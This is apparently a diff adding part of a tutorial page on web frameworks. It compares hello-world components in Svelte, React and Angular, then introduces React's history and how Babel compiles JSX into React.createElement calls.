+Like Vue, Svelte combines HTML, CSS, and JavaScript into a single file. The difference here is that Svelte requires a transpiler to generate browser-ready code, instead of a runtime virtual DOM.
+
+Svelte file
+```html
+<script>
+  let name = 'world';
+</script>
+
+<style>
+  p {
+    color: green;
+  }
+</style>
+
+<p>Hello {name}!</p>
+```
+React
+React combines JavaScript and HTML into its component format. CSS must be declared outside of the JSX file. The component itself highly leverages the functionality of JavaScript and can be represented as a function or class.
+
+JSX
+```js
+import 'hello.css';
+
+const Hello = () => {
+  let name = 'world';
+
+  return <p>Hello {name}</p>;
+};
+CSS
+
+p {
+  color: green;
+}
+```
+Angular component
+An Angular component defines what JavaScript, HTML, and CSS are combined together. This keeps a fairly strong separation of files that are usually grouped together in a directory rather than using the single file representation.
+
+JS
+```js
+@Component({
+  selector: 'app-hello-world',
+  templateUrl: './hello-world.component.html',
+  styleUrls: ['./hello-world.component.css'],
+})
+export class HelloWorldComponent {
+  name: string;
+  constructor() {
+    this.name = 'world';
+  }
+}
+```
+HTML
+```html
+<p>hello {{name}}</p>
+```
+CSS
+```js
+p {
+  color: green;
+}
+```
+
+## React
+React Logo
+
+🎥 Instruction video: React introduction
+
+📖 Recommended reading:
+
+MDN React Introduction Tutorial
+React Quick Start
+React, and its associated projects, provide a powerful web programming framework. The name React comes from its focus on making reactive web page components that automatically update based on user interactions or changes in the underlying data.
+
+Jordan Walke
+
+“The best drug is getting little things done that have been weighing on you. Instant high.”
+
+— Jordan Walke (Source: Twitter)
+
+React was created by Jordan Walke for use at Facebook in 2011. It was first used with Facebook's news feed and then as the main framework for Instagram. Shortly thereafter, Facebook open sourced the framework and it was quickly adopted by many popular web applications.
+
+React abstracts HTML into a JavaScript variant called JSX. JSX is converted into valid HTML and JavaScript using a preprocessor called Babel. For example, the following is a JSX file. Notice that it mixes both HTML and JavaScript into a single representation.
+```js
+const i = 3;
+const list = (
+  <ol class='big'>
+    <li>Item {i}</li>
+    <li>Item {3 + i}</li>
+  </ol>
+);
+```
+Babel will convert that into valid JavaScript:
+```js
+const i = 3;
+const list = React.createElement(
+  'ol',
+  { class: 'big' },
+  React.createElement('li', null, 'Item ', i),
+  React.createElement('li', null, 'Item ', 3 + i)
+);
+```
+The React.createElement function will then generate DOM elements and monitor the data they represent for changes. When a change is discovered, React will trigger dependent changes.
+
+## 
